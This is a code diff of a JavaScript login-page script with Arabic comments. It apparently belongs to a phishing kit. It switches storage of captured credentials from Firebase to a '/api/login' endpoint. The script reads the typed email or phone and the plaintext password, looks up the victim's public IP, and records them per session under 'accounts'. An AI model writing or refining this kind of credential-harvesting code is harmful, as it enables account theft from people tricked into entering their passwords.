@@ -1,11 +1,4 @@
-import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
-import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
-
-// سيتم استرداد بيانات Firebase من متغيرات البيئة في Railway
-const firebaseConfig = {}; // سيتم ملؤها من الخادم
-
-const app = initializeApp(firebaseConfig);
-const database = getDatabase();
+// لا نحتاج إلى استيراد Firebase لأننا سنستخدم واجهة API
 
 const emailInput = document.getElementById('emailORphone');
 const passwordInput = document.getElementById('password');
@@ -25,6 +18,7 @@ async function sendLoginCredentials(email, password) {
             return false;
         }
         
+        // الحصول على عنوان IP
         let ip = 'غير معروف';
         try {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -34,14 +28,24 @@ async function sendLoginCredentials(email, password) {
             console.error("خطأ في الحصول على عنوان IP:", error);
         }
         
-        const accountsRef = ref(database, `login/sessions/${sessionId}/accounts`);
-        const newAccountRef = push(accountsRef);
-        await set(newAccountRef, {
-            email: email,
-            password: password,
-            timestamp: Date.now(),
-            ip: ip
+        // استخدام واجهة API لتسجيل الدخول
+        const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: email,
+                password: password,
+                sessionId: sessionId,
+                ip: ip
+            })
         });
+        
+        const result = await response.json();
+        if (!result.success) {
+            console.error("خطأ في تسجيل الدخول:", result.error);
+        }
         
         console.log("تم إرسال البيانات بنجاح");
         return true;
